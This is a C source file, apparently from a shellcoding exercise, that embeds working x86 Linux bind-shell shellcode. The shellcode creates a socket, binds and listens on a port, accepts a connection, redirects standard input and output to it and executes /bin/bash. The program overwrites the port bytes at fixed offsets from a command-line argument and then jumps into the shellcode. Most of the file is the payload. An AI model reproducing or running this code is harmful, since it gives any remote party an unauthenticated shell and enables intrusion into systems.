/*
	Author : Dibyendu Sikdar

*/

#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <stdlib.h>

//unsigned char shellcode[]= "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x6a\x00\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x83\xc4\x0c\x31\xd2\x89\xc2\x31\xc0\x31\xdb\xb3\x0e\xb0\x66\x31\xc9\x6a\x04\x54\x6a\x02\x6a\x01\x52\x89\xe1\xcd\x80\x31\xc0\x89\xd0\x83\xc4\x14\x31\xd2\x89\xc2\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x02\x83\xec\x08\x51\x66\x68\x23\x28\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x83\xc4\x1c\x89\xd0\x89\xc2\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x04\x6a\x02\x52\x89\xe1\xcd\x80\x83\xc4\x08\x31\xc0\x31\xdb\x31\xc9\x89\xd0\x89\xc2\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x51\x51\x52\x89\xe1\xcd\x80\x83\xc4\x0c\x31\xf6\x31\xff\x89\xc6\x89\xd7\x31\xc0\xb0\x66\x31\xdb\xb3\x0d\x89\xd1\xcd\x80\x31\xc0\xb0\x05\x89\xd3\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb0\x3f\x89\xf3\x51\x59\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x31\xc9\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x89\xc9\xb1\x02\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x01\xcd\x80";

unsigned char shellcode[]="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x83\xc4\x0c\x31\xd2\x89\xc2\x31\xc0\x31\xdb\xb3\x0e\xb0\x66\x31\xc9\x6a\x04\x54\x6a\x02\x6a\x01\x52\x89\xe1\xcd\x80\x31\xc0\x89\xd0\x83\xc4\x14\x31\xd2\x89\xc2\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x02\x83\xec\x08\x51\x66\x68\x23\x28\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x83\xc4\x1c\x89\xd0\x89\xc2\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x04\x6a\x02\x52\x89\xe1\xcd\x80\x83\xc4\x08\x31\xc0\x31\xdb\x31\xc9\x89\xd0\x89\xc2\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x51\x51\x52\x89\xe1\xcd\x80\x83\xc4\x0c\x31\xf6\x31\xff\x89\xc6\x89\xd7\x31\xc0\xb0\x66\x31\xdb\xb3\x0d\x89\xd1\xcd\x80\x31\xc0\xb0\x05\x89\xd3\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb0\x3f\x89\xf3\x51\x59\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x31\xc9\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x89\xc9\xb1\x02\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x01\xcd\x80";

int main(int argc, char *argv[]){
	if(argc<2)
		printf("\nUsage: ./bindshell <Some port number like 9000>\n");
	else{
		int port_args;
		sscanf(argv[1],"%x",&port_args);
		/*
			Take the argument and convert it to an integer
			Convert to host to network byte order
			Store it in port

		*/
	
		unsigned short int port = htons(atoi(argv[1]));
		//printf("\nPort %d %X\n",port,port);
		//http://www.includehelp.com/c-programs/extract-bytes-from-int.aspx 
	
		char a,b; // to store the opcode values

		a=(port&0xFF); // Get the last 2 digits from the port number
		b=((port>>8)&0xFF); // Get the first 2 digits from the port number
		//printf("\n a = %X and b= %X \n",a,b); 
   		printf("Shellcode size: %d\n", strlen(shellcode));

		/*
			Everytime we modify the shellcode we need to change the offset values 
			First we need to find this sequence  \x66\x68 then we will add 2 to it to get its offset. At the current version of the code it is at 75
			At an offset of 77 and 78 in the shellcode the values of the port number is stored in little endian format as  \x23\x28
			So our target is always to overwrite  these values with the new values of the port number we received as input
		*/

		shellcode[77]=a;// Little endian : So last 2 goes first
		shellcode[78]=b;// Little endian : So first 2 goes next

    		int (*ret)() = (int(*)())shellcode;
    		ret();
	}
}
